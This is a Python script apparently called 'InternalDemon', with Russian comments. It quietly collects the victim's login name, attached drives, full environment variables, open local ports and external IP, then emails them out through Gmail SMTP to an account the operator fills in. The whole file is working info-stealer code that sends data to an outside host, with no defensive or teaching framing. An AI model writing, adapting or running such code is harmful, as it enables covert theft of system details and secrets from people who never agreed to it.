'''
NAME:    InternalDemon
AUTHOR:  S1DAL3X
PYTHON:  3.7.7
'''

import os, sys, socket, smtplib
from bs4 import BeautifulSoup  
from urllib.request import urlopen 

LOGIN       = os.getlogin()
DISKS       = []
SYSTEM_INFO = os.environ
PORTS       = [22, 25, 80, 139, 443, 445, 8080]
HOST          = '127.0.0.1'
NET_STAT    = []
system      = sys.platform

#определяем систему
def main():
    check_disk()


#проверяем подключенные диски
def check_disk():
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        path = letter + ':/'       
        try:
            if os.path.isdir(path):
                DISKS.append(path)
            else:
                pass
        except PermissionError:
            pass

    starter_net_scaner(HOST)


#сканер сети(сканируем открытые порты на хосте)
def net_scaner(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        connection = s.connect((host, port))
        connect = 'Host ' + str(host) + ' on port :' + str(port) + ' - is open.' + '\n'
        NET_STAT.append(connect)
        connection.close()
    except:
        pass


#запуск сканера сети
def starter_net_scaner(HOST):
    for port in PORTS:
        net_scaner(HOST, port)

    get_outside_ip()


#определение внешнего IP
def get_outside_ip():
    url = urlopen('https://yandex.ru/internet/')   
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('li', class_='parameter-wrapper general-info__parameter')
    out_str = str(out_str)                                                      
    ip = []
    
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
    OUTSIDE_IP = ''.join(ip)[3:]

    send_mail(OUTSIDE_IP)

#отправка данных
def send_mail(outside_ip):
    array = [
        '\n OUTSIDE_IP      => ' + str(outside_ip),
        '\n SYSTEM          => ' + str(system),
        '\n USER            => ' + str(LOGIN),
        '\n DISKS           => ' + str(DISKS),
        '\n SYSTEM_INFO     => ' + str(SYSTEM_INFO),
        '\n NET STATISTIC   => ' + str(NET_STAT),
    ]
    report_text = '--Success!--'.join(array)
    #print(array)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)
    msgObject.starttls()
    msgObject.login('СВОЙ_ЛОГИН@gmail.com', 'СВОЙ_ПАРОЛЬ')                                               # Авторизация                                          
    msgObject.sendmail('InternalDemon@gmail.com', 'СВОЙ_ЛОГИН@gmail.com', report_text.encode('utf8'))    # отправить(От кого, кому, сообщение)
    msgObject.quit()   

if __name__ == "__main__":
    main()
